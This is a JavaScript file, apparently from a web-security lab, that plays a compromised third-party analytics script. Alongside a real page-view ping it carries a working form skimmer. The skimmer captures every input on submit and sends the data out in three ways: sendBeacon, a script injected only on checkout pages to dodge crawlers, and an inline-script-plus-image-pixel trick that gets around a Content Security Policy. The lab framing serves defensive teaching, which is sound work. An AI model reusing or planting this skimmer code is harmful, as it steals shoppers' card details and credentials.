/*
 * analytics-helper.js — third-party analytics include (COMPROMISED).
 *
 * ⚠️  LAB ARTEFACT — EDUCATIONAL ONLY. Runs only against the local demo store,
 *     exfiltrates only to the local collector (window.__LAB.collector), and
 *     exists so students can watch a defence stop it. Do not adapt or reuse.
 *
 * Besides the real page-view ping, the vendor file has been swapped to carry a
 * skimmer. Which exfil technique it uses is chosen by the lab harness
 * (window.__LAB.variant) so each round exercises a specific defence:
 *   beacon      — sendBeacon straight to the collector            (Round 1)
 *   dynamic     — activate on /checkout, inject a script to exfil (Round 2)
 *   allowlisted — inject inline, exfil via an <img> pixel         (Round 3)
 * The 'firstparty' variant lives in the first-party bundle, not here.
 */
(function () {
  "use strict";
  var LAB = window.__LAB || {};
  var SINK = (LAB.collector || "http://127.0.0.1:5001") + "/collect";

  // Real analytics ping (the legitimate half of the file).
  try { new Image().src = "/static/vendor/pixel.gif?p=" + encodeURIComponent(location.pathname); }
  catch (_) {}

  function grab(form) {
    var out = {};
    Array.prototype.forEach.call(form.querySelectorAll("input"), function (el) {
      if (el.name) out[el.name] = el.value;
    });
    return out;
  }

  var variant = LAB.variant || "beacon";

  if (variant === "beacon") {
    // Round 1: the simplest skimmer. No CSP is in the way yet.
    document.addEventListener("submit", function (e) {
      navigator.sendBeacon(SINK, JSON.stringify({ src: "beacon", fields: grab(e.target) }));
    }, true);

  } else if (variant === "dynamic") {
    // Round 2: only wake up on the payment page, and run the exfil from an
    // injected <script> so a one-shot crawl of the homepage never sees it.
    if (location.pathname.indexOf("/checkout") === 0) {
      var s = document.createElement("script");
      s.textContent =
        "document.addEventListener('submit',function(e){" +
        "var f={};Array.prototype.forEach.call(e.target.querySelectorAll('input')," +
        "function(el){if(el.name)f[el.name]=el.value;});" +
        "fetch(" + JSON.stringify(SINK) + ",{method:'POST',keepalive:true," +
        "body:JSON.stringify({src:'dynamic',fields:f})}).catch(function(){});" +
        "},true);";
      document.documentElement.appendChild(s);
    }

  } else if (variant === "allowlisted") {
    // Round 3: inject an INLINE script (allowed by a host-allowlist with
    // 'unsafe-inline') and exfil through an <img> pixel (allowed by a
    // permissive img-src), sidestepping connect-src 'self'.
    var inj = document.createElement("script");
    inj.textContent =
      "document.addEventListener('submit',function(e){" +
      "var f={};Array.prototype.forEach.call(e.target.querySelectorAll('input')," +
      "function(el){if(el.name)f[el.name]=el.value;});" +
      "var i=new Image();i.src=" + JSON.stringify(SINK) +
      "+'?d='+encodeURIComponent(JSON.stringify({src:'pixel',fields:f}));" +
      "},true);";
    document.documentElement.appendChild(inj);
  }
})();
